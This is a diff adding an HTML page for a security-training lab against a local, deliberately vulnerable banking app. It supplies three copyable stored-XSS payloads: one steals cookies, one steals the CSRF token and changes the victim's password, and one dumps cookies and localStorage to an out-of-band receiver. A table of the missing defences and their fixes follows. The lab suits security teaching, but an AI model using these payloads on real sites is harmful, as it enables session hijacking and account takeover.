@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>M15 — Chain Attack Lab</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+  h1{color:var(--accent);font-size:22px;margin-bottom:8px}
+  p{color:var(--muted);font-size:13px;margin-bottom:24px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:16px}
+  h2{font-size:15px;margin-bottom:12px;color:var(--warn)}
+  .step{font-size:12px;color:var(--muted);margin-bottom:8px;padding-left:12px;border-left:2px solid var(--border)}
+  .payload{background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px;font-family:'Courier New',monospace;font-size:11px;color:var(--orange);word-break:break-all;white-space:pre-wrap;margin-bottom:10px}
+  button{padding:8px 18px;background:var(--accent);color:#0b0f1a;font-weight:700;border:none;border-radius:4px;cursor:pointer;font-size:12px;margin-right:8px;margin-top:8px}
+  .out{margin-top:12px;font-size:12px;color:var(--ok);font-family:'Courier New',monospace;min-height:20px}
+  .warn-box{background:#1a0000;border:1px solid var(--danger);border-radius:6px;padding:12px;margin-bottom:20px;font-size:12px;color:var(--danger)}
+  a{color:var(--accent);font-size:12px}
+</style>
+</head>
+<body>
+<h1>M15 — Attack Chain Lab</h1>
+<p>These attacks require the ChainBank server running at localhost:5000 and you being logged in as alice.</p>
+<div class="warn-box">Start the server first: <code>make py</code> in module_15/ — then log in at <a href="http://localhost:5000/auth/login" target="_blank">localhost:5000/auth/login</a> (alice / password123)</div>
+
+<div class="card">
+  <h2>Chain 1 — Cookie Theft → Session Hijack</h2>
+  <div class="step">Paste this as alice's bio. When the admin visits /auth/users, the payload fires and sends cookie to OOB receiver.</div>
+  <div class="payload">&lt;img src=x onerror="new Image().src='http://localhost:5001/oob?c='+encodeURIComponent(document.cookie)"&gt;</div>
+  <button onclick="navigator.clipboard.writeText(`<img src=x onerror="new Image().src='http://localhost:5001/oob?c='+encodeURIComponent(document.cookie)">`)">Copy payload</button>
+  <a href="http://localhost:5000/auth/profile" target="_blank">Open Profile page</a>
+  <div class="out" id="out1">Paste payload into bio → save → watch OOB receiver (terminal)</div>
+</div>
+
+<div class="card">
+  <h2>Chain 2 — CSRF Token Theft → Password Change</h2>
+  <div class="step">2-step async chain: GET /auth/settings to read the CSRF token, then POST /auth/change-password using it.</div>
+  <div class="payload">&lt;img src=x onerror="
+  fetch('/auth/settings')
+    .then(r =&gt; r.text())
+    .then(html =&gt; {
+      const token = (html.match(/name=['\&quot;]csrf['\&quot;].*?value=['\&quot;]([^'&quot;]+)/s)||[])[1]||'';
+      return fetch('/auth/change-password', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'csrf=' + encodeURIComponent(token) + '&amp;new_password=hacked123'
+      });
+    })
+    .then(r =&gt; r.json())
+    .then(d =&gt; new Image().src = 'http://localhost:5001/oob?result='+encodeURIComponent(JSON.stringify(d)))
+"&gt;</div>
+  <button onclick="copyChain2()">Copy payload</button>
+  <div class="out" id="out2">After saving this bio → OOB will show {"ok":true,"message":"Password changed for alice"}</div>
+</div>
+
+<div class="card">
+  <h2>Chain 3 — localStorage + Cookie Dump</h2>
+  <div class="step">Exfiltrates all client-side state in one request.</div>
+  <div class="payload">&lt;img src=x onerror="
+  fetch('http://localhost:5001/oob', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookie: document.cookie,
+      ls: JSON.stringify(localStorage),
+      url: location.href,
+      ua: navigator.userAgent
+    })
+  })
+"&gt;</div>
+  <button onclick="navigator.clipboard.writeText(document.querySelectorAll('.payload')[2].textContent.trim())">Copy payload</button>
+</div>
+
+<div class="card">
+  <h2>What makes these chains work?</h2>
+  <p style="color:var(--text);margin-bottom:8px;font-size:13px">Each chain exploits a specific missing defense:</p>
+  <table style="width:100%;font-size:12px;border-collapse:collapse">
+    <tr style="color:var(--muted)"><td style="padding:6px;border-bottom:1px solid var(--border)">Chain</td><td style="padding:6px;border-bottom:1px solid var(--border)">Missing defense</td><td style="padding:6px;border-bottom:1px solid var(--border)">Fix</td></tr>
+    <tr><td style="padding:6px;color:var(--danger)">Cookie theft</td><td style="padding:6px">HttpOnly flag not set</td><td style="padding:6px;color:var(--ok)">Set HttpOnly on session cookie</td></tr>
+    <tr><td style="padding:6px;color:var(--danger)">Password change</td><td style="padding:6px">No current-password re-auth</td><td style="padding:6px;color:var(--ok)">Require current password to change password</td></tr>
+    <tr><td style="padding:6px;color:var(--danger)">All chains</td><td style="padding:6px">No CSP to block fetch/Image beacon</td><td style="padding:6px;color:var(--ok)">CSP connect-src 'self'; img-src 'self'</td></tr>
+    <tr><td style="padding:6px;color:var(--danger)">Bio stored XSS</td><td style="padding:6px">Output not encoded on display</td><td style="padding:6px;color:var(--ok)">html.escape() before inserting into template</td></tr>
+  </table>
+</div>
+
+<script>
+function copyChain2() {
+  const p = `<img src=x onerror="
+  fetch('/auth/settings')
+    .then(r => r.text())
+    .then(html => {
+      const token = (html.match(/name=['\\"']csrf['\\"'].*?value=['\\"']([^'\\"']+)/s)||[])[1]||'';
+      return fetch('/auth/change-password', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'csrf=' + encodeURIComponent(token) + '&new_password=hacked123'
+      });
+    })
+    .then(r => r.json())
+    .then(d => new Image().src = 'http://localhost:5001/oob?result='+encodeURIComponent(JSON.stringify(d)))
+">`;
+  navigator.clipboard.writeText(p);
+}
+</script>
+</body>
+</html>
